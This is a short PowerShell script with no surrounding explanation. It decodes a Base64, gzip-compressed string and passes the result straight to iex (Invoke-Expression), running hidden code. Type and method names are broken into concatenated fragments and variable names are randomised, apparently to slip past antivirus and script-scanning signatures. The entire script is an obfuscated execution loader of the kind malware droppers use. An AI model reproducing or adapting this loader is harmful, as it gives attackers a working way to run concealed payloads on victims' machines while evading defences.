$acdukLom = @("H4sIAAAAAAAC/wsvyixJ1fUvLSkoLVFQT8usKCktSlUHAF41SMkWAAAA")
$dtPrEr = ""
$tp= [System.IO.Compression.CompressionMode]::Decompress

$ss = "System."
$ss += "IO.Me"
$ss += "morySt"
$ss += "ream"

$ftcl = "read"
$ftcl += "toend"

foreach ($element in $acdukLom) {
    $data = [System.Convert]::FromBase64String($element)
    $ms = New-Object $ss
    $ms.Write($data, 0, $data.Length)
    $ms.Seek(0,0) | Out-Null
    $somObj = New-Object System.IO.Compression.GZipStream($ms, $tp)
    $drD = New-Object System.IO.StreamReader($somObj)
    $vVar = $drD.$ftcl.Invoke()
    $dtPrEr += $vVar
}

$scriptPath = $MyInvocation.MyCommand.Path
$dtPrEr | iex

